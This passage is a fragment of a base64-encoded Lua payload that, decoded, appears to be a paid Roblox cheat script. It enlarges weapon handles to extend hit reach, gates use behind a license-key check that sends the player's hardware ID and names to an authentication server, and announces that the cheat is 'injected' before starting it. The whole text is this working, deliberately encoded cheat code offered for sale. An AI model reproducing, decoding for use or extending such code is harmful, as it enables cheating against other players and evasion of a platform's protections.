lvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgcmVhY2hDb25uZWN0aW9uID0gbmlsCiAgICAgICAgZW5kCiAgICBlbmQpKQoKICAgIFdhdGNoRm9yTmV3VG9vbHMoKQoKICAgIHRhYmxlLmluc2VydChDb25uZWN0aW9ucywgcGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hhcmFjdGVyKQogICAgICAgIG9yaWdpbmFsV2VhcG9uU2l6ZXMgPSB7fQogICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIFdhdGNoRm9yTmV3VG9vbHMoKQogICAgICAgIGlmIENvbmZpZy5XZWFwb25FeHRlbmRlciB0aGVuCiAgICAgICAgICAgIFNldFdlYXBvblNpemUoQ29uZmlnLldlYXBvbkxlbmd0aCkKICAgICAgICBlbmQKICAgIGVuZCkpCgogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICBpZiBDb25maWcuV2VhcG9uRXh0ZW5kZXIgdGhlbgogICAgICAgICAgICAgICAgU2V0V2VhcG9uU2l6ZShDb25maWcuV2VhcG9uTGVuZ3RoKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICB0YWJsZS5pbnNlcnQoQ29ubmVjdGlvbnMsIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBDb25maWcuV2VhcG9uRXh0ZW5kZXIgdGhlbgogICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgdG9vbCBpbiBwYWlycyhjaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaGFuZGxlID0gdG9vbDpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGFuZGxlIGFuZCBoYW5kbGU6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvbXBlbnNhdGlvbk11bHRpcGxpZXIgPSBDb25maWcuV2VhcG9uTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuU2l6ZU11bHRpcGxpZXJFbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wZW5zYXRpb25NdWx0aXBsaWVyID0gQ29uZmlnLldlYXBvbkxlbmd0aCAqIENvbmZpZy5TaXplTXVsdGlwbGllcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9yaWdpbmFsV2VhcG9uU2l6ZXNbdG9vbC5OYW1lXSBhbmQgb3JpZ2luYWxXZWFwb25TaXplc1t0b29sLk5hbWVdLkhhbmRsZVNpemUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhhbmRsZS5TaXplID0gb3JpZ2luYWxXZWFwb25TaXplc1t0b29sLk5hbWVdLkhhbmRsZVNpemUgKiBjb21wZW5zYXRpb25NdWx0aXBsaWVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGFuZGxlLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKSkKCiAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgIGNoYXJhY3Rlci5DaGlsZFJlbW92ZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkgcmVzdG9yZVRvb2xDb2xvcihjaGlsZCkgZW5kKQogICAgZW5kCmVuZAoKU2hvd0tleVN5c3RlbSA9IGZ1bmN0aW9uKCkKICAgIC0tIEZpcnN0IGNoZWNrIGlmIHNlcnZlciBpcyBpbiBtYWludGVuYW5jZSBtb2RlCiAgICBsb2NhbCByZXF1ZXN0RnVuYyA9IChzeW4gYW5kIHN5bi5yZXF1ZXN0KSBvciAoaHR0cCBhbmQgaHR0cC5yZXF1ZXN0KSBvciBodHRwX3JlcXVlc3Qgb3IgKGZsdXh1cyBhbmQgZmx1eHVzLnJlcXVlc3QpIG9yIHJlcXVlc3QKICAgIGlmIHJlcXVlc3RGdW5jIHRoZW4KICAgICAgICBsb2NhbCBod2lkID0gKGdldGh3aWQgYW5kIGdldGh3aWQoKSkgb3IgKGdldF9od2lkIGFuZCBnZXRfaHdpZCgpKSBvciBwbGF5ZXIuVXNlcklkCiAgICAgICAgbG9jYWwgc3VjY2VzcywgcmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIHJldHVybiByZXF1ZXN0RnVuYyh7CiAgICAgICAgICAgICAgICBVcmwgPSBBVVRIX1VSTCAuLiAiL3ZlcmlmeT9rZXk9TUFJTlRFTkFOQ0VfQ0hFQ0smaHdpZD0iIC4uIHRvc3RyaW5nKGh3aWQpIC4uICImdHlwZT1sb2dpbiIsCiAgICAgICAgICAgICAgICBNZXRob2QgPSAiR0VUIgogICAgICAgICAgICB9KQogICAgICAgIGVuZCkKICAgICAgICBpZiBzdWNjZXNzIGFuZCByZXNwb25zZSBhbmQgcmVzcG9uc2UuU3RhdHVzQ29kZSA9PSAyMDAgdGhlbgogICAgICAgICAgICBsb2NhbCBpc0pzb24sIGRhdGEgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBIdHRwU2VydmljZTpKU09ORGVjb2RlKHJlc3BvbnNlLkJvZHkpIGVuZCkKICAgICAgICAgICAgaWYgaXNKc29uIGFuZCBkYXRhIGFuZCBkYXRhLnN0YXR1cyA9PSAibWFpbnRlbmFuY2UiIHRoZW4KICAgICAgICAgICAgICAgIFNob3dNYWludGVuYW5jZVNjcmVlbihkYXRhLm1lc3NhZ2Ugb3IgIlNlcnZlcnMgYXJlIHVuZGVyIG1haW50ZW5hbmNlIikKICAgICAgICAgICAgICAgIHJldHVybiAtLSBFeGl0IHdpdGhvdXQgc2hvd2luZyBrZXkgc3lzdGVtCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIFNlbmROb3RpZmljYXRpb24oIkN5YmVycHVua3Mgc3VjY2Vzc2Z1bGx5IGluamVjdGVkIiwgMykKICAgIHRhc2sud2FpdCgzLjUpCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIFZlcmlmeUtleShpbnB1dEtleSkKICAgICAgICBsb2NhbCByZXF1ZXN0RnVuYyA9IChzeW4gYW5kIHN5bi5yZXF1ZXN0KSBvciAoaHR0cCBhbmQgaHR0cC5yZXF1ZXN0KSBvciBodHRwX3JlcXVlc3Qgb3IgKGZsdXh1cyBhbmQgZmx1eHVzLnJlcXVlc3QpIG9yIHJlcXVlc3QKICAgICAgICBpZiBub3QgcmVxdWVzdEZ1bmMgdGhlbiByZXR1cm4gZmFsc2UsICJIdHRwIE5vdCBTdXBwb3J0ZWQiIGVuZAoKICAgICAgICBsb2NhbCBod2lkID0gKGdldGh3aWQgYW5kIGdldGh3aWQoKSkgb3IgKGdldF9od2lkIGFuZCBnZXRfaHdpZCgpKSBvciBwbGF5ZXIuVXNlcklkCiAgICAgICAgbG9jYWwgc3VjY2VzcywgcmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIHJldHVybiByZXF1ZXN0RnVuYyh7CiAgICAgICAgICAgICAgICBVcmwgPSBBVVRIX1VSTCAuLiAiL3ZlcmlmeT9rZXk9IiAuLiBpbnB1dEtleSAuLiAiJmh3aWQ9IiAuLiB0b3N0cmluZyhod2lkKSAuLiAiJnR5cGU9bG9naW4mdXNlcm5hbWU9IiAuLiBIdHRwU2VydmljZTpVcmxFbmNvZGUocGxheWVyLk5hbWUpIC4uICImZGlzcGxheW5hbWU9IiAuLiBIdHRwU2VydmljZTpVcmxFbmNvZGUocGxheWVyLkRpc3BsYXlOYW1lKSwKICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJHRVQiCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kKQoKICAgICAgICBpZiBzdWNjZXNzIGFuZCByZXNwb25zZSBhbmQgcmVzcG9uc2UuU3RhdHVzQ29kZSA9PSAyMDAgdGhlbgogICAgICAgICAgICAtLSBFc3NheWVyIGRlIGxpcmUgbGUgSlNPTiAoTm91dmVhdSBzeXN0w6htZSBhdmVjIHRlbXBzKQogICAgICAgICAgICBsb2NhbCBpc0pzb24sIGRhdGEgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBIdHRwU2VydmljZTpKU09ORGVjb2RlKHJlc3BvbnNlLkJvZHkpIGVuZCkKICAgICAgICAgICAgaWYgaXNKc29uIGFuZCBkYXRhIGFuZCBkYXRhLnN0YXR1cyB0aGVuCiAgICAgICAgICAgICAgICBpZiBkYXRhLnN0YXR1cyA9PSAidmFsaWQiIHRoZW4KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZSwgbmlsLCBkYXRhLnJlbWFpbmluZywgZGF0YS53aGl0ZWxpc3RlZCAtLSBSZXRvdXJuZSBsZSB0ZW1wcyByZXN0YW50CiAgICAgICAgICAgICAgICBlbHNlaWYgZGF0YS5zdGF0dXMgPT0gIm1haW50ZW5hbmNlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gU2hvdyBtYWludGVuYW5jZSBzY3JlZW4gKHNjcmlwdCBub3QgcnVubmluZyB5ZXQpCiAgICAgICAgICAgICAgICAgICAgU2hvd01haW50ZW5hbmNlU2NyZWVuKGRhdGEubWVzc2FnZSBvciAiU2VydmVycyBhcmUgdW5kZXIgbWFpbnRlbmFuY2UiKQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZSwgIm1haW50ZW5hbmNlIgogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIG1vZE1zZyA9IGRhdGEubWVzc2FnZSBhbmQgKCJcbk1vZGVyYXRvciBNZXNzYWdlOiAiIC4uIGRhdGEubWVzc2FnZSkgb3IgIiIKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBkYXRhLnN0YXR1cyA9PSAicGF1c2VkIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllcjpLaWNrKCJZb3VyIGtleSBoYXMgYmVlbiBzdG9wIiAuLiBtb2RNc2cpCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIGRhdGEuc3RhdHVzID09ICJiYW5uZWQiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyOktpY2soIllvdXIga2V5IGhhcyBiZWVuIGRlbGV0ZWQiIC4uIG1vZE1zZykKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgZGF0YS5zdGF0dXMgPT0gImh3aWRfbWlzbWF0Y2giIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyOktpY2soIlRoaXMgaXMgbm90IHlvdXIga2V5LCBidXkgb25lIGluIHRoZSBkaXNjb3JkIHNlcnZlciIpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3RhdHVzTXNnID0gKGRhdGEuc3RhdHVzID09ICJwYXVzZWQiIGFuZCAiS2V5IGlzIFBhdXNlZCIpIG9yIChkYXRhLnN0YXR1cyA9PSAiYmFubmVkIiBhbmQgIktleSBEZWxldGVkIikgb3IgKGRhdGEuc3RhdHVzID09ICJod2lkX21pc21hdGNoIiBhbmQgIkhXSUQgTWlzbWF0Y2giKSBvciAiSW52YWxpZCBvciBFeHBpcmVkIgogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZSwgc3RhdHVzTXNnIC4uIG1vZE1zZwogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgLS0gRmFsbGJhY2sgKEFuY2llbiBzeXN0w6htZSB0ZXh0ZSkKICAgICAgICAgICAgbG9jYWwgYm9keSA9IHJlc3BvbnNlLkJvZHk6bG93ZXIoKTpnc3ViKCJeJXMqKC4tKSVzKiQiLCAiJTEiKQogICAgICAgICAgICBpZiBib2R5ID09ICJ2YWxpZCIgb3IgYm9keSA9PSAidHJ1ZSIgdGhlbiByZXR1cm4gdHJ1ZSwgbmlsLCA5OTk5OTk5OTkgZW5kCiAgICAgICAgICAgIHJldHVybiBmYWxzZSwgIkludmFsaWQgb3IgVXNlZCBLZXkiCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuIGZhbHNlLCAiQ29ubmVjdGlvbiBFcnJvciIKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIFBsYXlBbmltYXRpb24oZ3VpVG9EZXN0cm95LCBkdXJhdGlvbiwga2V5U3RyaW5nLCB3aGl0ZWxpc3RlZCkKICAgICAgICBsb2NhbCBBbmltYXRpb25HdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICAgICAgQW5pbWF0aW9uR3VpLk5hbWUgPSAiU2xhc2hJbnRybyIKICAgICAgICBBbmltYXRpb25HdWkuSWdub3JlR3VpSW5zZXQgPSB0cnVlCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBBbmltYXRpb25HdWkuUGFyZW50ID0gQ29yZUd1aSBlbmQpCiAgICAgICAgaWYgbm90IEFuaW1hdGlvbkd1aS5QYXJlbnQgdGhlbiBBbmltYXRpb25HdWkuUGFyZW50ID0gcGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikgZW5kCiAgICAgICAgCiAgICAgICAgLS0gQmFja2dyb3VuZCAoQmxhY2spCiAgICAgICAgbG9jYWwgQmFja2dyb3VuZCA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIEJhY2tncm91bmQuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgICAgIEJhY2tncm91bmQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICBCYWNrZ3JvdW5kLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjEKICAgICAgICBCYWNrZ3JvdW5kLlBhcmVudCA9IEFuaW1hdGlvbkd1aQogICAgICAgIAogICAgICAgIC0tIEZsYXNoIEVmZmVjdAogICAgICAgIGxvY2FsIEZsYXNoID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgRmxhc2guU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgICAgIEZsYXNoLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMubmV3KDEsIDEsIDEpCiAgICAgICAgRmxhc2guQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBGbGFzaC5aSW5kZXggPSAxMAogICAgICAgIEZsYXNoLlBhcmVudCA9IEFuaW1hdGlvbkd1aQogICAgICAgIAogICAgICAgIC0tIENvbnRhaW5lciBmb3Igc2xhc2hlcwogICAgICAgIGxvY2FsIFNsYXNoQ29udGFpbmVyID0gSW5zdGFuY2UubmV3KCJDYW52YXNHcm91cCIpCiAgICAgICAgU2xhc2hDb250YWluZXIuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgICAgIFNsYXNoQ29udGFpbmVyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgU2xhc2hDb250YWluZXIuR3JvdXBUcmFuc3BhcmVuY3kgPSAwCiAgICAgICAgU2xhc2hDb250YWluZXIuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgIFNsYXNoQ29udGFpbmVyLlBhcmVudCA9IEFuaW1hdGlvbkd1aQoKICAgICAgICAtLSBTb3VuZCAoU21va2UvU2xhc2gpCiAgICAgICAgbG9jYWwgU2xhc2hTb3VuZCA9IEluc3RhbmNlLm5ldygiU291bmQiKQogICAgICAgIFNsYXNoU291bmQuU291bmRJZCA9ICJyYnhhc3NldGlkOi8vMTMwNzY3NDg5IiAtLSBMYXNlciBzb3VuZAogICAgICAgIFNsYXNoU291bmQuVm9sdW1lID0gMQogICAgICAgIFNsYXNoU291bmQuUGFyZW50ID0gQW5pbWF0aW9uR3VpCiAgICAgICAgCiAgICAgICAgbG9jYWwgSW1wYWN0U291bmQgPSBJbnN0YW5jZS5uZXcoIlNvdW5kIikKICAgICAgICBJbXBhY3RTb3VuZC5Tb3VuZElkID0gInJieGFzc2V0aWQ6Ly8xMzA3Njc0ODkiCiAgICAgICAgSW1wYWN0U291bmQuUGl0Y2ggPSAwLjcKICAgICAgICBJbXBhY3RTb3VuZC5Wb2x1bWUgPSAxCiAgICAgICAgSW1wYWN0U291bmQuUGFyZW50ID0gQW5p" .. "bWF0aW9uR3VpCgogICAgICAgIC0tIFNraXAgQnV0dG9uCiAgICAgICAgbG9jYWwgU2tpcEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgU2tpcEJ0bi5UZXh0ID0gIlNLSVAgSU5UUk8iCiAgICAgICAgU2tpcEJ0bi5TaXplID0gVURpbTIubmV3KDAsIDEyMCwgMCwgMzApCiAgICAgICAgU2tpcEJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC02MCwgMC45LCAwKQogICAgICAgIFNraXBCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgU2tpcEJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIFNraXBCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgU2tpcEJ0bi5UZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgICAgIFNraXBCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgU2tpcEJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgU2tpcEJ0bi5aSW5kZXggPSAxMQogICAgICAgIFNraXBCdG4uUGFyZW50ID0gQW5pbWF0aW9uR3VpCiAgICAgICAgCiAgICAgICAgbG9jYWwgU0Nvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBTQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDEsIDApIFNDb3JuZXIuUGFyZW50ID0gU2tpcEJ0bgoKICAgICAgICBsb2NhbCBza2lwcGVkID0gZmFsc2UKICAgICAgICBsb2NhbCBmdW5jdGlvbiBjbGVhbnVwKCkKICAgICAgICAgICAgIEFuaW1hdGlvbkd1aTpEZXN0cm95KCkKICAgICAgICBlbmQKCiAgICAgICAgU2tpcEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgc2tpcHBlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgc2tpcHBlZCA9IHRydWUKICAgICAgICAgICAgCiAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoQmFja2dyb3VuZCwgVHdlZW5JbmZvLm5ldygwLjUpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShTbGFzaENvbnRhaW5lciwgVHdlZW5JbmZvLm5ldygwLjUpLCB7R3JvdXBUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCiAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoU2tpcEJ0biwgVHdlZW5JbmZvLm5ldygwLjUpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDEsIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCiAgICAgICAgICAgIAogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBjbGVhbnVwKCkKICAgICAgICAgICAgaWYgZ3VpVG9EZXN0cm95IHRoZW4gZ3VpVG9EZXN0cm95OkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgU3RhcnRDaGVhdChkdXJhdGlvbiwga2V5U3RyaW5nLCB3aGl0ZWxpc3RlZCkKICAgICAgICBlbmQpCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIFNoYWtlU2NyZWVuKGludGVuc2l0eSkKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBvcmlnaW5hbFBvcyA9IFNsYXNoQ29udGFpbmVyLlBvc2l0aW9uCiAgICAgICAgICAgICAgICBmb3IgaSA9IDEsIDggZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCBvZmZzZXQgPSBWZWN0b3IyLm5ldyhtYXRoLnJhbmRvbSgtaW50ZW5zaXR5LCBpbnRlbnNpdHkpLCBtYXRoLnJhbmRvbSgtaW50ZW5zaXR5LCBpbnRlbnNpdHkpKQogICAgICAgICAgICAgICAgICAgIFNsYXNoQ29udGFpbmVyLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIG9mZnNldC5YLCAwLCBvZmZzZXQuWSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBTbGFzaENvbnRhaW5lci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIENyZWF0ZVNsYXNoKHJvdGF0aW9uLCBpc0ZpbmFsKQogICAgICAgICAgICBTbGFzaFNvdW5kLlBpdGNoID0gbWF0aC5yYW5kb20oOTAsIDExMCkgLyAxMDAKICAgICAgICAgICAgU2xhc2hTb3VuZDpQbGF5KCkKICAgICAgICAgICAgbG9jYWwgU2xhc2ggPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICAgICAgU2xhc2guQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICAgICAgU2xhc2guQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgICAgICBTbGFzaC5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQogICAgICAgICAgICBTbGFzaC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKICAgICAgICAgICAgU2xhc2guUm90YXRpb24gPSByb3RhdGlvbgogICAgICAgICAgICBTbGFzaC5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICAgICAgICAgIFNsYXNoLlBhcmVudCA9IFNsYXNoQ29udGFpbmVyCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBHbG93CiAgICAgICAgICAgIGxvY2FsIEdsb3cgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgICAgICAgICAgR2xvdy5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgIEdsb3cuVGhpY2tuZXNzID0gMgogICAgICAgICAgICBHbG93LlRyYW5zcGFyZW5jeSA9IDAuNQogICAgICAgICAgICBHbG93LlBhcmVudCA9IFNsYXNoCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBBbmltYXRpb24gZCdleHRlbnNpb24gKEZyZWVzdHlsZSkKICAgICAgICAgICAgbG9jYWwgd2lkdGggPSBpc0ZpbmFsIGFuZCAxMjAgb3IgNTAKICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShTbGFzaCwgVHdlZW5JbmZvLm5ldygwLjE1LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtTaXplID0gVURpbTIubmV3KDEuNSwgMCwgMCwgd2lkdGgpfSk6UGxheSgpCiAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoR2xvdywgVHdlZW5JbmZvLm5ldygwLjMpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQogICAgICAgICAgICBTaGFrZVNjcmVlbihpc0ZpbmFsIGFuZCAxMCBvciAzKQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAKICAgICAgICAgICAgLS0gMS4gVmVydGljYWwgU2xhc2gKICAgICAgICAgICAgQ3JlYXRlU2xhc2goOTAsIGZhbHNlKQogICAgICAgICAgICB0YXNrLndhaXQoMC4yNSkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIDIuIERpYWdvbmFsIFNsYXNoIDEKICAgICAgICAgICAgQ3JlYXRlU2xhc2goNDUsIGZhbHNlKQogICAgICAgICAgICB0YXNrLndhaXQoMC4yNSkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIDMuIERpYWdvbmFsIFNsYXNoIDIKICAgICAgICAgICAgQ3JlYXRlU2xhc2goLTQ1LCBmYWxzZSkKICAgICAgICAgICAgdGFzay53YWl0KDAuMjUpCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSA0LiBIb3Jpem9udGFsIFNsYXNoIChJbWFnZSkKICAgICAgICAgICAgbG9jYWwgbGFzdFJvdCA9IDAKICAgICAgICAgICAgQ3JlYXRlU2xhc2gobGFzdFJvdCwgdHJ1ZSkKICAgICAgICAgICAgCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBJTVBBQ1QKICAgICAgICAgICAgSW1wYWN0U291bmQ6UGxheSgpCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBGbGFzaCBXaGl0ZQogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKEZsYXNoLCBUd2VlbkluZm8ubmV3KDAuMSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNX0pOlBsYXkoKQogICAgICAgICAgICB0YXNrLmRlbGF5KDAuMSwgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShGbGFzaCwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIEhpZGUgU2xhc2hlcwogICAgICAgICAgICBTbGFzaENvbnRhaW5lci5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIFNob3cgSW1hZ2UKICAgICAgICAgICAgbG9jYWwgT3BlbmluZ0ltYWdlID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIikKICAgICAgICAgICAgT3BlbmluZ0ltYWdlLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkKICAgICAgICAgICAgT3BlbmluZ0ltYWdlLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKQogICAgICAgICAgICBPcGVuaW5nSW1hZ2UuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKICAgICAgICAgICAgT3BlbmluZ0ltYWdlLlJvdGF0aW9uID0gbGFzdFJvdCAtLSBSb3RhdGlvbiBzeW5jaHJvbmlzw6llIGF2ZWMgbGEgZGVybmnDqHJlIGxpZ25lCiAgICAgICAgICAgIE9wZW5pbmdJbWFnZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICBPcGVuaW5nSW1hZ2UuSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzc3MDcxODEyOTMxNjUyIgogICAgICAgICAgICBPcGVuaW5nSW1hZ2UuU2NhbGVUeXBlID0gRW51bS5TY2FsZVR5cGUuU3RyZXRjaAogICAgICAgICAgICBPcGVuaW5nSW1hZ2UuSW1hZ2VUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgIE9wZW5pbmdJbWFnZS5QYXJlbnQgPSBBbmltYXRpb25HdWkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHNpemVUd2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUoT3BlbmluZ0ltYWdlLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7U2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLC